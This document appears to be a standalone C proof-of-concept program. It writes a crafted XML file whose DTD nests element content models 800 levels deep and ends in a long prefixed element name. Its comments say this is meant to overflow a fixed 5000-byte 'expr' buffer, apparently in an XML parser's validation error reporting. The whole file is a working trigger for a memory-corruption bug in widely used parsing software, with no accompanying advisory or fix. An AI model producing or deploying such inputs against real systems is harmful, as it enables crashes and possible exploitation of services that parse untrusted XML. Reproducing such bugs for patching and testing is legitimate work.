#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Create a deeply nested content model that will overflow the expr[5000] buffer */
    /* The structure is: (a, (b, (c, (...(pppp...:nnnn...)...)))) */
    /* Where a, b, c are 1-byte element names */
    /* And the deepest element has a 42-byte prefix and 42-byte name */

    fprintf(f, "<?xml version=\"1.0\"?>\n");
    fprintf(f, "<!DOCTYPE root [\n");

    /* Start the content model */
    fprintf(f, "<!ELEMENT root (");

    /* Create 800 levels of nesting with 1-byte element names */
    for (int i = 0; i < 800; i++) {
        fprintf(f, "a, (");
    }

    /* At the deepest level, use an element with a 42-byte prefix and 42-byte name */
    fprintf(f, "pppppppppppppppppppppppppppppppppppppppppp:nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn");

    /* Close all the parentheses */
    for (int i = 0; i < 800; i++) {
        fprintf(f, ")");
    }
    fprintf(f, ")>\n");

    /* Declare elements */
    fprintf(f, "<!ELEMENT a EMPTY>\n");
    fprintf(f, "<!ELEMENT pppppppppppppppppppppppppppppppppppppppppp:nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn EMPTY>\n");

    fprintf(f, "]>\n");

    /* Invalid content to trigger validation error */
    fprintf(f, "<root><unknown/></root>\n");

    fclose(f);
    return 0;
}
